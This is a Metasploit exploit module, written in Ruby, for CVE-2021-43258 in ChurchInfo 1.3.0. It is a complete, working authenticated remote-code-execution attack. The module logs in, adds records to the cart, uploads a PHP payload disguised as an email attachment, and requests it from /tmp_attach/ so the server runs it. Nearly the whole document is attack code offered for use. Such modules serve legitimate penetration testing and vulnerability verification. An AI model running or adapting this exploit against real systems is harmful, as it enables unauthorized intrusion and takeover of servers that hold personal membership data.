##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ChurchInfo v.1.3.0 Authenticated RCE Exploit CVE-2021-43258',
        'Description' => %q{
          This module exploits the email attachment upload staging from the CartView.php page. Uploading
          a file as an attachment places it in the /tmp_attach/ folder before its submitted and can be
          interpreted as PHP code by the server. This requires authentication to the application. This
          vulnerability is assigned CVE-2021-43258.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'm4lwhere <m4lwhere@protonmail.com>' ],
        'References' => [
          ['URL', 'http://www.churchdb.org/'],
          ['URL', 'http://sourceforge.net/projects/churchinfo/'],
          ['CVE', '2021-43258']
        ],
        'Platform' => 'php',
        'Privileged' => false,
        'Arch' => ARCH_PHP,
        'Targets' => [['Automatic Targeting', { 'auto' => true }]],
        'DisclosureDate' => '2021-10-30',
        'DefaultTarget' => 0,
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_fs_delete_file
            ]
          }
        },
        'Notes' => {
          'Stability' => ['CRASH_SAFE'],
          'Reliability' => ['REPEATABLE_SESSION'],
          'SideEffects' => ['ARTIFACTS_ON_DISK', 'IOC_IN_LOGS']
        }
      )
    )
    # Set the email subject and message if interested
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('USERNAME', [true, 'Username for ChurchInfo application', 'admin']),
        OptString.new('PASSWORD', [true, 'Password to login with', 'churchinfoadmin']),
        OptString.new('TARGETURI', [true, 'The location of the ChurchInfo app', '/churchinfo/']),
        OptString.new('EMAIL_SUBJ', [true, 'Email subject in webapp', 'Exploit Subj']),
        OptString.new('EMAIL_MESG', [true, 'Email message in webapp', 'Here\'s a lovely message'])
      ]
    )

    self.needs_cleanup = true
  end

  #
  # The exploit method attempts a login, adds items to the cart, then creates the email attachment.
  # Adding items to the cart is required for the server-side code to accept the upload.
  #

  def exploit
    # Need to gather cookie value first to pass to application
    vprint_status('Gathering PHP session cookie')
    if datastore['SSL'] == true
      vprint_status('SSL is true, changing Proto parameter in URL')
      login_page = datastore['APPBASE'] + 'Default.php?Proto=https&Path=' + datastore['RHOSTS'] + ':' + datastore['RPORT'].to_s + '%2F' + datastore['APPBASE']
    else
      vprint_status('SSL is false, leaving Proto parameter as http')
      login_page = datastore['APPBASE'] + 'Default.php?Proto=http&Path=' + datastore['RHOSTS'] + ':' + datastore['RPORT'].to_s + '%2F' + datastore['APPBASE']
    end
    vprint_status("Login page is #{login_page}")
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, login_page),
      'method' => 'GET'
    )

    # Grab our assigned session cookie
    cookie = res.get_cookies
    vprint_good("PHP session cookie is #{cookie}")
    vprint_status('Attempting login')

    # Attempt a login with the cookie assigned, server will assign privs on server-side if authenticated
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, login_page),
      'method' => 'POST',
      'cookie' => cookie,
      'vars_post' => {
        'User' => datastore['USERNAME'],
        'Password' => datastore['PASSWORD'],
        'sURLPath' => login_page
      }
    )

    # a valid login will give us a 302 redirect to CheckVersion.php so check that.
    unless res && res.code == 302
      fail_with(Failure::UnexpectedReply, "#{peer} - Check if credentials are correct (response code: #{res.code})")
    end
    print_good("Logged into application as #{datastore['USERNAME']}")
    vprint_status('Attempting exploit')

    # We must establish items in the cart before we can sent the emails. This is a hard requirement server-side.
    print_status('Navigating to add items to cart')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, datastore['APPBASE'], 'SelectList.php'),
      'method' => 'GET',
      'vars_get' => {
        'Sort' => 'name',
        'Filter' => '',
        'mode' => 'person',
        'Letter' => '',
        'Gender' => '',
        'Classification' => '',
        'FamilyRole' => '',
        'PersonProperties' => '',
        'grouptype' => '',
        'AddAllToCart' => 'Add+to+Cart'
      },
      'cookie' => cookie
    )

    # Need to check that items were successfully added to the cart
    # Here we're looking through html for the version string, similar to:
    # Items in Cart: 2
    /Items in Cart: (?<cart>\d)/ =~ res.body
    if cart.to_i < 1
      print_error("Items in Cart: #{cart}")
      fail_with(Failure::UnexpectedReply,
                "Failure to add items to cart, #{cart} items were detected. Check if there are person entries in the application")
    end
    print_good("Items in Cart: #{cart}")

    # Uploading exploit as temporary email attachment
    print_good('Uploading exploit via Email temp email attachment')
    payload_name = rand_text_alpha(rand(5..14)) + '.php'
    vprint_status("Payload name is #{payload_name}")

    # Create the POST payload with required parameters to be parsed by the server
    post_data = Rex::MIME::Message.new
    post_data.add_part(payload.encoded, 'application/octet-stream', nil,
                       "form-data; name=\"Attach\"; filename=\"#{payload_name}\"")
    vprint_status('Payload added to post_data')
    post_data.add_part(datastore['EMAIL_SUBJ'], '', nil, 'form-data; name="emailsubject"')
    vprint_status('Subject added to post_data')
    post_data.add_part(datastore['EMAIL_MESG'], '', nil, 'form-data; name="emailmessage"')
    vprint_status('emailmessage added to post_data')
    post_data.add_part('Save Email', '', nil, 'form-data; name="submit"')
    vprint_status('submit added to post_data')
    file = post_data.to_s
    file.strip!
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, datastore['APPBASE'] + 'CartView.php'),
      'method' => 'POST',
      'data' => file,
      'cookie' => cookie,
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}"
    )

    # Perform GET to PHP code uploaded as attachment and be interpreted by the server
    exploit_uri = normalize_uri(target_uri.path, datastore['APPBASE'], 'tmp_attach', payload_name)
    print_good("Exploit uploaded to #{exploit_uri}")
    print_warning("Don't forget to clean up artifacts at #{exploit_uri}")
    res = send_request_cgi({
      'uri' => exploit_uri,
      'method' => 'GET'
    })

    # If we don't get a 200, there must've been an error somewhere. Bummer :(
    unless res && res.code == 200
      fail_with(Exploit::Failure::Unknown, "#{peer} - Exploit failed, received HTTP " + res.code.to_s)
    end
  rescue ::Rex::ConnectionError
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
  end
end
